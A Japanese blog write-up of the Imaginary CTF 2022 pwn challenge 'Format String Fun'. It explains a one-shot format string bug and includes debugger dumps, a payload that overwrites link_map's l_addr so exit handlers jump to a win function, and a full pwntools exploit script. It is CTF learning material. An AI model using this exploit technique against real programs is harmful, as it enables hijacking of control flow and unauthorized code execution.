+++
title = "Imaginary CTF 2022 - Format String Fun"
date = 2022-07-19

[taxonomies]
tags = ["CTF", "Writeup", "Pwn", "FSB"]
+++

※CTF中に解けなくて、Discordを見ながら解いた

## TL;DR

- 1回だけのFSB
- スタック上の値で書き込み可能なアドレスを指しているものを探す
- 終了時に呼び出される関数ポインタを計算するための値を書き換えられるので、これをペイロードの格納先であるグローバル変数になるようにする

## Prerequisite

- ELF終了時の処理(下記で紹介する参考文献を参照)

## Writeup

checksecした結果は次の通り

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Ghidraでデコンパイルした結果は次の通り

```c
undefined8 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts("Welcome to Format Fun!");
  puts("I\'ll print one, AND ONLY ONE, string for you.");
  puts("Enter your string below:");
  fgets(buf,400,stdin);
  printf(buf);
  return 0;
}
```

実は`main`の他に`win`関数が存在しそこへ飛べばフラグが開示される。ちなみにCTF中はこれに気付いていなかった。

`main`関数には自明なFSBが存在する[^1]。但し、見てわかるように1回しか使えないし、libc leakも出来ているわけではないので意外とやれる事は限られている。

ひとまず、`%n`でどこかに書き込みをしたいのでスタックの様子を眺めてwritableなアドレスを指している箇所を探す[^2]。

```
pwndbg> telescope 32
00:0000│ rbp rsp  0x7ffd8d228080 ◂— 0x0
01:0008│          0x7ffd8d228088 —▸ 0x7fb285fab0b3 (__libc_start_main+243) ◂— mov    edi, eax
02:0010│          0x7ffd8d228090 —▸ 0x7fb2861b6620 (_rtld_global_ro) ◂— 0x50a1000000000
03:0018│          0x7ffd8d228098 —▸ 0x7ffd8d228178 —▸ 0x7ffd8d22a256 ◂— './fmt_fun'
04:0020│          0x7ffd8d2280a0 ◂— 0x100000000
05:0028│          0x7ffd8d2280a8 —▸ 0x4011b6 (main) ◂— endbr64 
06:0030│          0x7ffd8d2280b0 —▸ 0x401270 (__libc_csu_init) ◂— endbr64 
07:0038│          0x7ffd8d2280b8 ◂— 0xd05c077a3f3683ca
08:0040│          0x7ffd8d2280c0 —▸ 0x4010d0 (_start) ◂— endbr64 
09:0048│          0x7ffd8d2280c8 —▸ 0x7ffd8d228170 ◂— 0x1
0a:0050│          0x7ffd8d2280d0 ◂— 0x0
... ↓
0c:0060│          0x7ffd8d2280e0 ◂— 0x2fa71d3f3e1683ca
0d:0068│          0x7ffd8d2280e8 ◂— 0x2f390c8f5ff883ca
0e:0070│          0x7ffd8d2280f0 ◂— 0x0
... ↓
11:0088│          0x7ffd8d228108 ◂— 0x1
12:0090│          0x7ffd8d228110 —▸ 0x7ffd8d228178 —▸ 0x7ffd8d22a256 ◂— './fmt_fun'
13:0098│          0x7ffd8d228118 —▸ 0x7ffd8d228188 —▸ 0x7ffd8d22a260 ◂— 'COLORTERM=truecolor'
14:00a0│          0x7ffd8d228120 —▸ 0x7fb2861b8190 ◂— 0x0
15:00a8│          0x7ffd8d228128 ◂— 0x0
... ↓
17:00b8│          0x7ffd8d228138 —▸ 0x4010d0 (_start) ◂— endbr64 
18:00c0│          0x7ffd8d228140 —▸ 0x7ffd8d228170 ◂— 0x1
19:00c8│          0x7ffd8d228148 ◂— 0x0
... ↓
1b:00d8│          0x7ffd8d228158 —▸ 0x4010fe (_start+46) ◂— hlt    
1c:00e0│          0x7ffd8d228160 —▸ 0x7ffd8d228168 ◂— 0x1c
1d:00e8│          0x7ffd8d228168 ◂— 0x1c
1e:00f0│ r13      0x7ffd8d228170 ◂— 0x1
1f:00f8│          0x7ffd8d228178 —▸ 0x7ffd8d22a256 ◂— './fmt_fun'
```

1回しか`printf`が使えず、FSBでパズルや運試しをする真似はしたくなかったのでスタック上のアドレスを指しているものはwritableだが無視する(少々のパズルと運試しで解けるのでやりたい人は下記Other Solutionを参照)。そうなると、使えるのはELF, libc, ldの為に確保されたwritableな領域であり、該当するのは上のスタックダンプにおいて0x14番目の0x7ffd8d22812であり、ここの値となっている0x7fb2861b8190はldの配置先の下に存在し、writableな領域である。

この0x7fb2861b8190が何を指しているかだが、CTF終了後にDiscordに載っていた記事: [ångstromCTF 2021 - wallstreet (pwn) | TJCSC](https://activities.tjhsst.edu/csc/writeups/angstromctf-2021-wallstreet)によると、終了時に呼び出される関数のアドレス解決に用いる`link_map`構造体らしい。詳しい説明は記事とglibcを読んでいただくとして、`link_map`の先頭メンバである`l_addr`を書き換えると、呼び出される関数ポインタの配列が変化する。よってFSBでここを書き換えると、`l_addr`が書き換わることになり、ここは元々0だったことを考えると書き込んだ分だけ関数ポインタの配列がずれることになる。

実際にここを0から114に変えてみた結果が次の通り(該当する書式文字列は`%114c%26$n`)

```
pwndbg> run
Starting program: /home/xornet/CTF/2022/imaginaryCTF_2022/format_string_fun/fmt_fun 
Welcome to Format Fun!
I'll print one, AND ONLY ONE, string for you.
Enter your string below:
%114c%26$n
                                                                                                                 

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7fe0f58 in ?? () from /lib64/ld-linux-x86-64.so.2
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
 RAX  0x0
 RBX  0x7ffff7ffd060 (_rtld_global) —▸ 0x7ffff7ffe190 ◂— 0x72 /* 'r' */
 RCX  0x0
 RDX  0x1
 RDI  0x7ffff7ffd968 (_rtld_global+2312) ◂— 0x0
 RSI  0x403e2a (_DYNAMIC+106) ◂— 0xfef5000000000000
 R8   0x1
 R9   0x7fffffffdd24 ◂— 0x1
 R10  0x2
 R11  0x246
 R12  0x0
 R13  0x7fffffffdde0 —▸ 0x7ffff7ffe190 ◂— 0x72 /* 'r' */
 R14  0x403e2a (_DYNAMIC+106) ◂— 0xfef5000000000000
 R15  0x7ffff7ffe190 ◂— 0x72 /* 'r' */
 RBP  0x7fffffffde50 ◂— 0x0
 RSP  0x7fffffffdde0 —▸ 0x7ffff7ffe190 ◂— 0x72 /* 'r' */
 RIP  0x7ffff7fe0f58 ◂— call   qword ptr [r14]
──────────────────────────────────────[ DISASM ]───────────────────────────────────────
 ► 0x7ffff7fe0f58    call   qword ptr [r14] <0xfef5000000000000>
        rdi: 0x7ffff7ffd968 (_rtld_global+2312) ◂— 0x0
        rsi: 0x403e2a (_DYNAMIC+106) ◂— 0xfef5000000000000
        rdx: 0x1
        rcx: 0x0
 
   0x7ffff7fe0f5b    mov    rdx, r14
   0x7ffff7fe0f5e    sub    r14, 8
   0x7ffff7fe0f62    cmp    qword ptr [rbp - 0x38], rdx
   0x7ffff7fe0f66    jne    0x7ffff7fe0f58 <0x7ffff7fe0f58>
    ↓
   0x7ffff7fe0f58    call   qword ptr [r14] <0xfef5000000000000>
        rdi: 0x7ffff7ffd968 (_rtld_global+2312) ◂— 0x0
        rsi: 0x403e2a (_DYNAMIC+106) ◂— 0xfef5000000000000
        rdx: 0x1
        rcx: 0x0
 
   0x7ffff7fe0f5b    mov    rdx, r14
   0x7ffff7fe0f5e    sub    r14, 8
   0x7ffff7fe0f62    cmp    qword ptr [rbp - 0x38], rdx
   0x7ffff7fe0f66    jne    0x7ffff7fe0f58 <0x7ffff7fe0f58>
    ↓
   0x7ffff7fe0f58    call   qword ptr [r14] <0xfef5000000000000>
        rdi: 0x7ffff7ffd968 (_rtld_global+2312) ◂— 0x0
        rsi: 0x403e2a (_DYNAMIC+106) ◂— 0xfef5000000000000
        rdx: 0x1
        rcx: 0x0
───────────────────────────────────────[ STACK ]───────────────────────────────────────
00:0000│ r13 rsp  0x7fffffffdde0 —▸ 0x7ffff7ffe190 ◂— 0x72 /* 'r' */
01:0008│          0x7fffffffdde8 —▸ 0x7ffff7ffe740 —▸ 0x7ffff7fce000 ◂— jg     0x7ffff7fce047
02:0010│          0x7fffffffddf0 —▸ 0x7ffff7fb7000 —▸ 0x7ffff7dc5000 ◂— 0x3010102464c457f
03:0018│          0x7fffffffddf8 —▸ 0x7ffff7ffd9e8 (_rtld_global+2440) —▸ 0x7ffff7fcf000 ◂— 0x10102464c457f
04:0020│          0x7fffffffde00 ◂— 0x7fffffffde00
... ↓
06:0030│          0x7fffffffde10 —▸ 0x404040 (buf) ◂— '%114c%26$n\n'
07:0038│          0x7fffffffde18 —▸ 0x403e2a (_DYNAMIC+106) ◂— 0xfef5000000000000
─────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
 ► f 0     7ffff7fe0f58
   f 1     7ffff7e0ea27 __run_exit_handlers+247
   f 2     7ffff7e0ebe0 on_exit
   f 3     7ffff7dec0ba __libc_start_main+250
───────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

`call   qword ptr [r14]`で落ちている。`r14`の値を見ると、`R14  0x403e2a (_DYNAMIC+106) ◂— 0xfef5000000000000`となっており、`_DYNAMIC`で示された箇所から106だけずれた場所になっている。ここで先程0から114に書き換えた事を考えるとこの値から8だけ引いた分が`_DYNAMIC`との差分になると思われる。よってここを上手く調整して`[r14]`が`win`関数を指すようにしたい。

この問題のELFは非常に都合良く出来ており、この`_DYNAMIC`はグローバル変数である`buf`の上に存在している。よって、`_DYNAMIC + x`が`buf`の中を指すように`x`をFSBを用いて調整し、そこに`win`関数へのアドレスを置いておけば終了時に`win`が呼び出されることが期待できる。`x`を細かく調整するのは面倒なので、`_DYNAMIC`から`buf`までの差分に8を足してそこからFSBのペイロード分を足して更に余裕を持たせた値を設定し、一方、関数ポインタとなる箇所には周辺に`win`関数の値を敷き詰めてどこが来ても飛べるという荒業を使った[^3]。

## Code

```python
from pwn import remote, process, p64, ELF, u64
import sys


DEBUG = "-d" in sys.argv


if DEBUG:
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
else:
    libc = ELF("./libc.so.6")

elf = ELF("./fmt_fun")

addrs = {
    "win": 0x401251,
    "_DYNAMIC": 0x403e2a - 106,  # from debugger
    "buf": 0x404040
}

# ================== exploit ====================

if DEBUG:
    sc = remote("localhost", 13337)
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
    input("[+] attach")
else:
    sc = remote("fmt-fun.chal.imaginaryctf.org", 1337)
    libc = ELF("./libc.so.6")

sc.recvuntil(b"below:\n")

diff = addrs["buf"] - addrs["_DYNAMIC"]  # 640

print(hex(diff), diff)

fmt_payload = f"%{diff+8+64}c%26$n"
pad = b"\x00" * (16 - len(fmt_payload) % 16)
win_pad = p64(addrs["win"]) * 20
payload = fmt_payload.encode() + pad + win_pad

assert len(payload) < 400

sc.sendline(payload)
sc.interactive()

```

## Flag

CTF中に解いていないが、まだサーバーが動いていたので解き直した。

`ictf{n0t_imp0ssibl3?_1b06af92}`

## Other Solution

実はこの問題には非常に単純な解法が存在する。では何故それを使わなかったのかというと成功確率が1/4096だからである。

通常、スタックには環境変数へのポインタ等でスタックのアドレスが入っている事が多い(そうでなくても呼び出し元の`rbp`が入っていたりする)。よって、その下位2バイト程度を書き換えればスタック上のアドレスを作ることが出来る。ここで次のような構造をしているスタックを考える。

```
i: return address
...
j: address on stack -> k -> somewhere on stack
...
k: address on stack -> somewhere on stack
```

`i,j,k`はアドレスであるが、説明の都合上、FSBで指定する数値として扱うこともある。

`j`に対して`%n`を指定すると`k`に書き込みが行われる。ここで`k`にはスタックのアドレスが入っていることから、`%hn`や`%hhn`で下位バイトを少し書き換えることで別のスタックのアドレスを指すことがわかる。そこでもし`i`を指すように書き換えることが出来たとすると(後述するが、この確率は1/4096)次のような構造になる。

```
# after write to k by `%hn`
i: return address
...
j: address on stack -> k -> i
...
k: address on stack -> i
```

この状態で今度は`k`に対して`%n`を指定すると、`i`に書き込みが行われる。ここで、`i`はリターンアドレスが入っていたことから、これでRIPが取れたことになる。

但し、これを実現するためには事前にスタックの下位2バイトをGuessする必要がある。末尾1ニブルは確定しているのでこれは$1/16^3 = 1/4096$の確率で当たることになる。

実はCTF中は`win`関数の存在に気付かず、仮に1/4096を当てる事が出来たとしても`main`に戻ってまたFSBを利用しなくてはならなかったので面倒でやる気が起こらなかった[^4]。今振り返ると、1/4096の確率でRIPをとる事が出来るとこまではやっていたので`win`関数の存在にさえ気付いていれば解けた可能性があり、惜しいことをした。

## References

- [ångstromCTF 2021 - wallstreet (pwn) | TJCSC](https://activities.tjhsst.edu/csc/writeups/angstromctf-2021-wallstreet): CTFのDiscordで貼られていた記事
	- そこからたどれるglibcのソースコードも大いに参考になった(glibc 2.32だったがこの問題のglibc 2.31でも同様だと思われる)

---

[^1]: このCTFでこの問題を含めて3回出ているので、作者はFSBが好きなのかもしれない

[^2]: pwndbgだと色が付いていて見やすいがブログに出力をコピペする時はそうもいかない

[^3]: Heap Sprayで`nop`を連発したり、ROPで`ret`を連発するみたいな感じで実は気に入っている方法である

[^4]: 更に`printf`では一度位置指定としての数字を使うとその時点で各数字に対応する値が確定する。よって`%n`での書き換えを同一書式文字列で複数回行おうとすると`%n`は実質1回しか使えず、後は`%`を大量に並べるクソパズルになったのもやる気を削いだ原因の1つ
